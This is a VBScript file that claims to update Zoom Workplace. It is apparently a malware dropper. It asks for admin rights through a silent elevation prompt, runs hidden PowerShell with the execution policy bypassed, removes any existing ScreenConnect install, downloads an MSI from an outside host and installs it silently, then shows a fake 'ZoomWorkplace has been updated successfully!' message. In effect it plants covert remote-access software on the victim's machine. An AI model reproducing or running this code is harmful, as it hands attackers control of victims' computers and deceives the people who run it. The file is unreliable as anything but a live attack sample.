Option Explicit
Dim oShell, oFSO, sTempFolder, sMsiURL, sMsiFile
Dim nResult, sMessage

Set oShell = CreateObject("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")
sTempFolder = oShell.ExpandEnvironmentStrings("%TEMP%")
sMsiFile = oFSO.BuildPath(sTempFolder, "sdc.msi")

sMsiURL = "https://seworks.mhawkster01.info/sdc"

If Not IsAdmin() Then
    ElevateSilent()
    WScript.Quit 0
End If

Dim sScript
sScript = "& {" & vbCrLf & _
          "    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" & vbCrLf & _
          "    $msiFile = '" & sMsiFile & "'" & vbCrLf & _
          "    $msiUrl = '" & sMsiURL & "'" & vbCrLf & _
          "    Write-Host 'Checking for existing sdc...'" & vbCrLf & _
          "    $existing = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -like '*screenconnect*' }" & vbCrLf & _
          "    if ($existing) { $existing | ForEach-Object { $_.Uninstall() }; Start-Sleep -Seconds 3 }" & vbCrLf & _
          "    Write-Host 'Downloading sdc...'" & vbCrLf & _
          "    Invoke-WebRequest -Uri $msiUrl -OutFile $msiFile -UseBasicParsing" & vbCrLf & _
          "    Write-Host 'Installing sdc...'" & vbCrLf & _
          "    Start-Process msiexec -ArgumentList '/i', $msiFile, '/qn', '/norestart' -Wait" & vbCrLf & _
          "    Remove-Item $msiFile -ErrorAction SilentlyContinue" & vbCrLf & _
          "    Write-Host 'Installation complete'" & vbCrLf & _
          "}"


oShell.Run "PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & sScript & """", 0, True

MsgBox "ZoomWorkplace has been updated successfully!", vbInformation, "Installation Complete"

WScript.Quit 0

Function IsAdmin()
    On Error Resume Next
    Dim oTestShell, oTestFSO, sTestFile
    Set oTestShell = CreateObject("WScript.Shell")
    Set oTestFSO = CreateObject("Scripting.FileSystemObject")
    sTestFile = oTestShell.ExpandEnvironmentStrings("%SystemRoot%\System32\admin_test.tmp")
    oTestFSO.CreateTextFile(sTestFile, True).Close
    oTestFSO.DeleteFile(sTestFile)
    IsAdmin = (Err.Number = 0)
    On Error GoTo 0
End Function

Sub ElevateSilent()
    Dim oShellApp
    Set oShellApp = CreateObject("Shell.Application")
    oShellApp.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 0
End Sub
